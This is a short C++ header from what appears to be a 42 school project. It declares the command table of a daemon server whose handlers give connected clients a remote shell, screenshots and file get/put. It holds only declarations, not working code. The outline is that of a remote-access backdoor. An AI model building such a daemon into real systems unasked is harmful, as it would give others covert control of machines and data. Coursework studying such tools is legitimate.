/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   commands.hpp                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: kiroussa <oss@xtrm.me>                     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/11/28 22:00:44 by kiroussa          #+#    #+#             */
/*   Updated: 2025/11/29 01:52:44 by kiroussa         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

# include "DaemonServer.hpp"

#ifndef COMMANDS_HPP
# define COMMANDS_HPP

typedef struct
{
	const char *command;
	const char *usage;
	const char *description;
	int (*fn)(Client *client, const char *args);
}	Command;

# define CMD_OK 0
# define CMD_LOGOUT 1
# define CMD_SPAWN_SHELL 2

int	shield_cmd_help(Client *client, const char *args);
int	shield_cmd_shell(Client *client, const char *args);
int	shield_cmd_screenshot(Client *client, const char *args);
int	shield_cmd_get(Client *client, const char *args);
int	shield_cmd_put(Client *client, const char *args);
int	shield_cmd_quit(Client *client, const char *args);

#endif
